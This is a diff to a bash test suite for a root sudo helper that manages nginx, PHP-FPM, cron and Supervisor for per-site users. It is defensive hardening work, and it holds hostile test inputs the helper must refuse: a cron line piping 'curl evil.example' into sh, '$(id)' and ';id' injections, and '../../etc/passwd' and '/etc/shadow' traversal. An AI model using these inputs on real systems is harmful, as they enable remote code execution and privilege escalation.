@@ -54,20 +54,79 @@ printf 'user www-data; include /tmp/x;\n' > "$WORK/nginx-junk.conf"
 printf 'user $(id);\n' > "$WORK/nginx-inject.conf"
 printf 'user\twww-data;\n' > "$WORK/nginx-tab.conf"
 
+# Site users: registries in <etc>/sites, one file per user. etc-sites is the default /etc/eeploi.
+add_sites() {
+  mkdir -p "$1/sites"
+  chmod 755 "$1" "$1/sites"
+  printf 'DOMAIN=shop.example\nHOME=/srv/eeploi/shop_example\nCRON=/etc/cron.d/eeploi-shop_example\nREDIS_CONF=/etc/eeploi/redis/shop_example.conf\n' > "$1/sites/shop_example"
+  printf '# a comment\nDOMAIN=www.shop.example\n\n' > "$1/sites/shop"
+  local user
+  for user in shop_other shop_sudo shop_low shop_away shop_group shop_half; do
+    printf 'DOMAIN=%s.example\n' "${user#shop_}" > "$1/sites/$user"
+  done
+}
+add_sites "$WORK/etc-sites"
+add_sites "$WORK/etc-conf"
+add_sites "$WORK/etc-plain"
+printf 'DOMAIN=shop.example\n' > "$WORK/etc-plain/sites/shop_example"
+# The longest name: 32 characters, for db-create's socket login.
+LONG_USER=b2345678901234567890123456789012
+printf 'DOMAIN=long.example\n' > "$WORK/etc-sites/sites/$LONG_USER"
+# Broken registries, each in a folder of its own: the helper refuses them all.
+for bad in writable link badline inject twice nodomain baddomain folder; do
+  add_sites "$WORK/etc-reg-$bad"
+done
+chmod 666 "$WORK/etc-reg-writable/sites/shop_example"
+rm "$WORK/etc-reg-link/sites/shop_example"
+ln -s "$WORK/etc-sites/sites/shop_example" "$WORK/etc-reg-link/sites/shop_example"
+printf 'DOMAIN=shop.example\nPATH=/tmp\n' > "$WORK/etc-reg-badline/sites/shop_example"
+# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
+printf 'DOMAIN=$(id)\n' > "$WORK/etc-reg-inject/sites/shop_example"
+printf 'DOMAIN=shop.example\nDOMAIN=other.example\n' > "$WORK/etc-reg-twice/sites/shop_example"
+printf 'HOME=/srv/eeploi/shop_example\n' > "$WORK/etc-reg-nodomain/sites/shop_example"
+printf 'DOMAIN=shop\n' > "$WORK/etc-reg-baddomain/sites/shop_example"
+chmod 777 "$WORK/etc-reg-folder/sites"
+
+# What the server has (EEPLOI_HELPER_SYSTEM): users, groups, their groups (id -G), paths and running units.
+# account <user> <uid> <home> <id -G>: a user with a group of its own, same name and id, and its home.
+account() {
+  printf 'passwd %s:x:%s:%s::%s:/usr/sbin/nologin\ngroup %s:x:%s:\nid %s:%s\npath %s\n' "$1" "$2" "$2" "$3" "$1" "$2" "$1" "$4" "$3"
+}
+{
+  account shop_example 1001 /srv/eeploi/shop_example 1001
+  account shop 1002 /srv/eeploi/shop 1002
+  account shop_other 1003 /srv/eeploi/shop_other 1003
+  account shop_sudo 1004 /srv/eeploi/shop_sudo '1004 27'
+  account shop_low 999 /srv/eeploi/shop_low 999
+  account shop_away 1005 /home/shop_away 1005
+  echo 'passwd shop_group:x:1006:1010::/srv/eeploi/shop_group:/usr/sbin/nologin'
+  echo 'group shop_group:x:1006:'
+  echo 'id shop_group:1010'
+  account "$LONG_USER" 1007 "/srv/eeploi/$LONG_USER" 1007
+  account alex 1000 /home/alex 1000
+  echo 'group shop_staff:x:1011:'
+  echo 'path /srv/eeploi/shop_left'
+  echo 'path /srv/eeploi'
+  echo 'path /usr/bin/redis-server'
+} > "$WORK/system"
+grep -v redis-server "$WORK/system" > "$WORK/system-no-redis"
+{ cat "$WORK/system"; echo 'active eeploi-redis@shop_example.service'; } > "$WORK/system-redis-on"
+
 # A copy with a well-formed (fake) release key, to test self-update past the key check.
 FAKE_KEY='RWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 sed "s#^PUBKEY=.*#PUBKEY='$FAKE_KEY'#" "$HELPER" > "$WORK/keyed-helper"
 
 # call <args...>: run the helper in dry-run mode. Settings (temporary per call):
-#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR, NGINX (nginx.conf), BIN (helper file), DRYRUN (1 or empty),
-#   DBSTATE (what db-create's checks find)
+#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR (default etc-sites), NGINX (nginx.conf), BIN (helper file),
+#   DRYRUN (1 or empty), DBSTATE (what db-create's checks find), SYS (what the server has, default system)
 call() {
   local dry=${DRYRUN-1}
   OUT=$(printf '%s' "${IN:-}" | env -i PATH="$PATH" \
     EEPLOI_HELPER_DRY_RUN="$dry" SUDO_USER="${AS-eeploi}" \
-    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-empty}" \
+    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-sites}" \
     EEPLOI_HELPER_NGINX_CONF="${NGINX:-$WORK/nginx-default.conf}" \
     EEPLOI_HELPER_DB_STATE="${DBSTATE:-}" \
+    EEPLOI_HELPER_SYSTEM="${SYS-$WORK/system}" \
     bash "${BIN:-$HELPER}" "$@" 2>&1)
   CODE=$?
 }
@@ -115,11 +174,11 @@ else
 fi
 
 echo "== existing subcommands"
-ok "version" "1.0.1" version
+ok "version" "1.0.2" version
 ok "nginx-test" "run: nginx -t" nginx-test
 ok "nginx-reload" "run: service nginx reload" nginx-reload
 ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
-ok "vhost" "write: /etc/nginx/sites-available/example.com (644)" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
+ok "vhost" "write: /etc/nginx/sites-available/shop.example (644)" vhost-write shop.example shop_example 8.4
 ok "vhost-backup" "run: cp /etc/nginx/sites-available/example.com /var/lib/eeploi/nginx/example.com/vhost" vhost-backup example.com
 ok "vhost-restore" "run: cp /var/lib/eeploi/nginx/example.com/vhost /etc/nginx/sites-available/example.com" vhost-restore example.com
 ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
@@ -130,21 +189,22 @@ ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vho
 ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
 IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
 ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
-IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-example.com-horizon.conf (644)" \
-  supervisor-write eeploi-example.com-horizon /home/eeploi/example.com/current 2
+IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-shop.example-horizon.conf (644)" \
+  supervisor-write eeploi-shop.example-horizon shop_example /srv/eeploi/shop_example/shop.example/current 2
 ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
 ok "supervisor-remove-site" "" supervisor-remove-site example.com
 ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
 ok "resume" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused /etc/supervisor/conf.d/worker-233475.conf" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
 ok "supervisor-update" "run: supervisorctl update" supervisor-update
-IN=$'* * * * * eeploi php8.4 /home/eeploi/example.com/current/artisan schedule:run > /dev/null 2>&1\n' \
-  ok "cron" "write: /etc/cron.d/eeploi-example.com (644)" cron-write example.com
-ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-example.com" cron-remove example.com
+CRON_LINE=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n'
+IN=$CRON_LINE ok "cron" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
+ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-shop_example" cron-remove shop_example
 ok "crontab-restore" "add back to /etc/crontab: the lines in /var/lib/eeploi/crontab/example.com" crontab-restore example.com
 IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines example.com
 IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines saves" "save: /var/lib/eeploi/crontab/example.com" crontab-remove-lines example.com
-ok "env" "runuser -u eeploi -- sh -c" env-install /home/ploi/example.com/.env /home/eeploi/example.com/.env eeploi
-ok "storage-copy" "run: tar -C /home/ploi/a/storage -cf - . | runuser -u eeploi -- tar -C /home/eeploi/a/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
+SITE=/srv/eeploi/shop_example/shop.example
+ok "env" "runuser -u shop_example -- sh -c" env-install /home/ploi/example.com/.env $SITE/.env shop_example
+ok "storage-copy" "run: tar -C /home/ploi/a/storage -cf - . | runuser -u shop_example -- tar -C $SITE/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage $SITE/storage shop_example
 
 echo "== refusals"
 AS='' refuse "not through sudo" "run through sudo" version
@@ -152,54 +212,56 @@ AS=root refuse "root as caller" "run through sudo" version
 AS=www-data refuse "other user as caller" "run through sudo" version
 refuse "no subcommand" "usage"
 refuse "unknown subcommand" "unknown subcommand" rm -rf /
-refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' /run/php/php8.4-fpm.sock
+refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' shop_example 8.4
 refuse "domain without a dot" "invalid domain" vhost-enable localhost
 refuse "domain with a slash" "invalid domain" vhost-backup ../../etc/passwd
 refuse "uppercase domain" "invalid domain" vhost-enable Example.com
 refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
 refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
-refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow /home/eeploi/x/.env eeploi
-refuse "path outside home" "outside the allowed home folders" storage-copy /etc /home/eeploi/x/storage eeploi
-refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x /home/eeploi/x/storage eeploi
+refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow $SITE/.env shop_example
+refuse "path outside home" "outside the allowed home folders" storage-copy /etc $SITE/storage shop_example
+refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x $SITE/storage shop_example
 AS=ploi refuse "copy from own home" "source cannot be in /home/ploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
-refuse "copy into ploi's home" "not in /home/eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env eeploi
-refuse "other owner" "owner must be eeploi" env-install /home/ploi/a/.env /home/eeploi/a/.env root
+refuse "copy into ploi's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/ploi/b/.env shop_example
+refuse "other owner" "reserved name, not a site user: root" env-install /home/ploi/a/.env $SITE/.env root
 refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
 refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
 refuse "program name" "invalid program" supervisor-remove nginx
-IN='id' refuse "daemon directory outside home" "outside the allowed home folders" supervisor-write eeploi-example.com-a /etc 1
-IN='id' refuse "daemon directory in another home" "not in /home/eeploi" supervisor-write eeploi-example.com-a /home/ploi/a 1
-IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 33
-IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 0
-IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-example.com-a /home/eeploi/a 1
+IN='id' refuse "daemon directory outside home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /etc 1
+IN='id' refuse "daemon directory in another home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /home/ploi/a 1
+IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 33
+IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 0
+IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
 refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
-IN=$'* * * * * root php /home/eeploi/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write example.com
-IN=$'* * * * * eeploi curl evil.example | sh\n' refuse "cron any command" "only" cron-write example.com
-IN=$'* * * * * eeploi php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "outside the allowed home folders" cron-write example.com
+IN=$'* * * * * root php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write shop_example
+IN=$'* * * * * shop_example curl evil.example | sh\n' refuse "cron any command" "only" cron-write shop_example
+IN=$'* * * * * shop_example php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "only" cron-write shop_example
 refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
 refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines example.com /etc/passwd
 
 echo "== root escapes (server-access audit, 2026-11-09)"
 # vhost-write: the vhost is built by the helper; caller content can't reach nginx (root opens log files).
 IN=$'access_log /etc/cron.d/x;\n' refuse "vhost from stdin" "usage" vhost-write example.com
-IN=$'access_log /etc/cron.d/x;\n' lacks "vhost ignores stdin" "/etc/cron.d" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
-ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-example.com-access.log;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
-ok "vhost root in the caller's home" "root /home/eeploi/example.com/current/public;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
-refuse "vhost socket" "invalid PHP-FPM socket" vhost-write example.com /tmp/evil.sock
+# etc-plain: a registry without a CRON line, so /etc/cron.d can only come from stdin.
+IN=$'access_log /etc/cron.d/x;\n' ETC_DIR="$WORK/etc-plain" lacks "vhost ignores stdin" "/etc/cron.d" vhost-write shop.example shop_example 8.4
+ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-shop.example-access.log;" vhost-write shop.example shop_example 8.4
+ok "vhost root in the site user's home" "root /srv/eeploi/shop_example/shop.example/current/public;" vhost-write shop.example shop_example 8.4
+refuse "vhost socket from the PHP version" "invalid PHP version" vhost-write shop.example shop_example '8.4-fpm.sock;/tmp/evil'
 # ssl-include-write: gone; take-over backups are made and restored by root (vhost-backup, vhost-restore).
 IN=$'access_log /etc/cron.d/x;\n' refuse "ssl include from stdin" "unknown subcommand" ssl-include-write example.com
 refuse "vhost-read gone" "unknown subcommand" vhost-read example.com
 refuse "ssl-read gone" "unknown subcommand" ssl-read example.com.key
 # supervisor-write: built from arguments; one command line, log in /var/log/supervisor.
 IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=eeploi\nstdout_logfile=/etc/cron.d/x\n' refuse "supervisor config from stdin" "usage" supervisor-write eeploi-example.com-a
-IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-example.com-a /home/eeploi/a 1
-IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi-example.com-a.log" supervisor-write eeploi-example.com-a /home/eeploi/a 1
-IN='php artisan horizon' ok "supervisor as the caller" "user=eeploi" supervisor-write eeploi-example.com-a /home/eeploi/a 1
-# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the caller writes.
-refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage /home/eeploi/b/storage eeploi
-refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env /home/eeploi/b/.env eeploi
-lacks "env not written by root" "install -o" env-install /home/ploi/a/.env /home/eeploi/a/.env eeploi
-lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
+IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
+IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi/shop_example/eeploi-shop.example-a.log" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
+IN='php artisan horizon' ok "supervisor as the site user" "user=shop_example" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
+# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the site user writes.
+refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage $SITE/storage shop_example
+refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env $SITE/.env shop_example
+refuse "env from a site home" "source must be in /home/ploi or /home/forge" env-install /srv/eeploi/shop/www.shop.example/.env $SITE/.env shop_example
+lacks "env not written by root" "install -o" env-install /home/ploi/a/.env $SITE/.env shop_example
+lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage $SITE/storage shop_example
 # self-update: only a newer version than the installed one.
 BIN="$WORK/keyed-helper" refuse "downgrade" "only a newer version" self-update 0.9.9
 # crontab: only ploi or forge jobs in their home; restore adds back only those lines.
@@ -212,20 +274,20 @@ IN=$'access_log /etc/cron.d/x;\n' refuse "ssl-write not a certificate" "not one 
 
 echo "== second helper audit (2026-11-10)"
 # env-install and storage-copy: only a .env file and a storage folder.
-refuse "env source not a .env" "source must end in /.env" env-install /home/ploi/.ssh/id_ed25519 /home/eeploi/a/.env eeploi
-refuse "env source .env in the middle" "source must end in /.env" env-install /home/ploi/a/.env/x /home/eeploi/a/.env eeploi
-refuse "env source like .env" "source must end in /.env" env-install /home/forge/a/.env.backup /home/eeploi/a/.env eeploi
-refuse "env source a storage folder" "source must end in /.env" env-install /home/ploi/a/storage /home/eeploi/a/.env eeploi
-refuse "storage source not storage" "source must end in /storage" storage-copy /home/ploi/.ssh /home/eeploi/a/storage eeploi
-refuse "storage source the home" "source must end in /storage" storage-copy /home/forge/a /home/eeploi/a/storage eeploi
-refuse "storage source in storage" "source must end in /storage" storage-copy /home/ploi/a/storage/app /home/eeploi/a/storage eeploi
-refuse "storage source like storage" "source must end in /storage" storage-copy /home/ploi/a/old-storage /home/eeploi/a/storage eeploi
-ok "env from forge" "run: dd if=/home/forge/example.com/.env iflag=nofollow" env-install /home/forge/example.com/.env /home/eeploi/example.com/.env eeploi
-ok "storage from a deploy folder" "run: tar -C /home/ploi/a-deploy/storage -cf -" storage-copy /home/ploi/a-deploy/storage /home/eeploi/a/storage eeploi
+refuse "env source not a .env" "source must end in /.env" env-install /home/ploi/.ssh/id_ed25519 $SITE/.env shop_example
+refuse "env source .env in the middle" "source must end in /.env" env-install /home/ploi/a/.env/x $SITE/.env shop_example
+refuse "env source like .env" "source must end in /.env" env-install /home/forge/a/.env.backup $SITE/.env shop_example
+refuse "env source a storage folder" "source must end in /.env" env-install /home/ploi/a/storage $SITE/.env shop_example
+refuse "storage source not storage" "source must end in /storage" storage-copy /home/ploi/.ssh $SITE/storage shop_example
+refuse "storage source the home" "source must end in /storage" storage-copy /home/forge/a $SITE/storage shop_example
+refuse "storage source in storage" "source must end in /storage" storage-copy /home/ploi/a/storage/app $SITE/storage shop_example
+refuse "storage source like storage" "source must end in /storage" storage-copy /home/ploi/a/old-storage $SITE/storage shop_example
+ok "env from forge" "run: dd if=/home/forge/example.com/.env iflag=nofollow" env-install /home/forge/example.com/.env $SITE/.env shop_example
+ok "storage from a deploy folder" "run: tar -C /home/ploi/a-deploy/storage -cf -" storage-copy /home/ploi/a-deploy/storage $SITE/storage shop_example
 # self-update: strictly newer, compared by number.
-BIN="$WORK/keyed-helper" refuse "same version" "only a newer version" self-update 1.0.1
+BIN="$WORK/keyed-helper" refuse "same version" "only a newer version" self-update 1.0.2
 BIN="$WORK/keyed-helper" refuse "older version" "only a newer version" self-update 0.99.99
-BIN="$WORK/keyed-helper" ok "newer patch" "download:" self-update 1.0.2
+BIN="$WORK/keyed-helper" ok "newer patch" "download:" self-update 1.0.3
 BIN="$WORK/keyed-helper" ok "newer minor" "download:" self-update 1.1.0
 BIN="$WORK/keyed-helper" ok "newer major" "download:" self-update 2.0.0
 BIN="$WORK/keyed-helper" ok "numbers, not text" "download:" self-update 1.0.10
@@ -243,9 +305,10 @@ BIN="$WORK/keyed-helper" ok "curl without curlrc" "run: curl -q --fail" self-upd
 echo "== deploy user from helper.conf"
 lacks "default homes have no deploy" "deploy" version
 AS=deploy refuse "deploy without config" "run through sudo" version
-AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.1" version
-AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home allowed" "runuser -u deploy -- sh -c" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
-ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.1" version
+AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.2" version
+AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy copies into a site home" "runuser -u shop_example -- sh -c" env-install /home/ploi/a/.env $SITE/.env shop_example
+AS=deploy ETC_DIR="$WORK/etc-conf" refuse "the deploy user is not a site user" "reserved name, not a site user: deploy" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
+ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.2" version
 ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
 ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
 ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
@@ -269,55 +332,76 @@ else
   echo "note: /etc/eeploi/new-server exists here, skipped the override test"
 fi
 
-echo "== acl-nginx"
-ok "www-data" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
-NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /home/eeploi" acl-nginx
-NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
-NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
-NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" acl-nginx
-ok "checks the user exists" "check: user www-data and group www-data exist" acl-nginx
-ok "installs acl when missing" "check: setfacl installed, else apt-get install acl" acl-nginx
-AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home" "run: setfacl -m u:www-data:x /home/deploy" acl-nginx
-NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" acl-nginx
-NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" acl-nginx
-NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" acl-nginx
-NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" acl-nginx
-NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" acl-nginx
-refuse "acl-nginx arguments" "usage" acl-nginx www-data
+echo "== nginx user (site-user-create)"
+# A new site user: no registry, no user, group or home of that name.
+NEW=(site-user-create shop_new new.example)
+ok "www-data" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
+NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /srv/eeploi/shop_new" "${NEW[@]}"
+NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
+NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
+NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" "${NEW[@]}"
+ok "checks the user exists" "check: user www-data and group www-data exist" "${NEW[@]}"
+ok "installs acl when missing" "check: setfacl installed, else apt-get install acl" "${NEW[@]}"
+NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" "${NEW[@]}"
+NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" "${NEW[@]}"
+NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" "${NEW[@]}"
+NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" "${NEW[@]}"
+NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" "${NEW[@]}"
+NGINX="$WORK/nginx-group.conf" refuse "the nginx user is reserved" "reserved name, not a site user: nginx" site-user-create nginx new.example
+refuse "acl-nginx is gone" "unknown subcommand" acl-nginx
 
 echo "== php-pool-write"
-ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi.conf (644)" php-pool-write 8.4
-ok "pool name" "[eeploi]" php-pool-write 8.4
-ok "pool user" "user = eeploi" php-pool-write 8.4
-ok "pool group" "group = eeploi" php-pool-write 8.4
-ok "pool socket" "listen = /run/php/php8.4-fpm-eeploi.sock" php-pool-write 8.4
-ok "socket owner" "listen.owner = www-data" php-pool-write 8.4
-ok "socket group" "listen.group = www-data" php-pool-write 8.4
-ok "socket mode" "listen.mode = 0660" php-pool-write 8.4
-ok "ondemand" "pm = ondemand" php-pool-write 8.4
-ok "timeout" "request_terminate_timeout = 300" php-pool-write 8.4
-ok "test before reload" "run: php-fpm8.4 -t
-run: service php8.4-fpm reload" php-pool-write 8.4
-NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3
-AS=deploy ETC_DIR="$WORK/etc-conf" ok "pool as deploy" "user = deploy" php-pool-write 8.4
-refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x'
+POOL=(php-pool-write 8.4 shop_example)
+ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf (644)" "${POOL[@]}"
+ok "pool name" "[shop_example]" "${POOL[@]}"
+ok "pool user" "user = shop_example" "${POOL[@]}"
+ok "pool group" "group = shop_example" "${POOL[@]}"
+ok "pool socket" "listen = /run/php/php8.4-fpm-shop_example.sock" "${POOL[@]}"
+ok "socket owner" "listen.owner = www-data" "${POOL[@]}"
+ok "socket group" "listen.group = www-data" "${POOL[@]}"
+ok "socket mode" "listen.mode = 0660" "${POOL[@]}"
+ok "ondemand" "pm = ondemand
+  pm.max_children = 5
+  pm.process_idle_timeout = 10s
+  pm.max_requests = 500
+  request_terminate_timeout = 60" "${POOL[@]}"
+ok "opcache ini" "write: /etc/php/8.4/fpm/conf.d/90-eeploi.ini (644)
+  ; Written by eeploi-helper (php-pool-write). eeploi rewrites this file, do not edit.
+  opcache.validate_permission = 1" "${POOL[@]}"
+ok "test before reload" "run: php-fpm8.4 -t" "${POOL[@]}"
+ok "reload last" "run: service php8.4-fpm reload" "${POOL[@]}"
+ok "pool in the registry" "  POOL=/etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf
+write: $WORK/etc-sites/sites/shop_example (644)" "${POOL[@]}"
+lacks "no [eeploi] pool" "[eeploi]" "${POOL[@]}"
+lacks "no shared pool file" "pool.d/eeploi.conf" "${POOL[@]}"
+NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3 shop_example
+AS=deploy ETC_DIR="$WORK/etc-conf" lacks "pool never as the deploy user" "user = deploy" "${POOL[@]}"
+refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x' shop_example
 refuse "pool version missing" "usage" php-pool-write
-refuse "pool two versions" "usage" php-pool-write 8.3 8.4
-NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" php-pool-write 8.4
+refuse "pool without a user" "usage" php-pool-write 8.4
+refuse "pool two versions" "usage" php-pool-write 8.3 8.4 shop_example
+refuse "pool for an unlisted user" "alex is not an eeploi site user" php-pool-write 8.4 alex
+refuse "pool for the deploy user" "reserved name, not a site user: eeploi" php-pool-write 8.4 eeploi
+NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" "${POOL[@]}"
 
 echo "== vhost-set-socket"
-ok "to eeploi socket" "fastcgi_pass unix:/run/php/php8.4-fpm-eeploi.sock;" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
-ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
+SOCK=/run/php/php8.4-fpm-shop_example.sock
+ok "to the site's socket" "fastcgi_pass unix:$SOCK;" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
+ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
 ok "nginx -t then reload" "run: nginx -t
-run: service nginx reload" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
-ok "rollback" "fastcgi_pass unix:/var/run/php/php8.4-fpm.sock;" vhost-set-socket example.com /run/php/php8.4-fpm-eeploi.sock /var/run/php/php8.4-fpm.sock
-ok "run/php default" "unix:/run/php/php8.3-fpm-eeploi.sock;" vhost-set-socket example.com /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-eeploi.sock
+run: service nginx reload" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
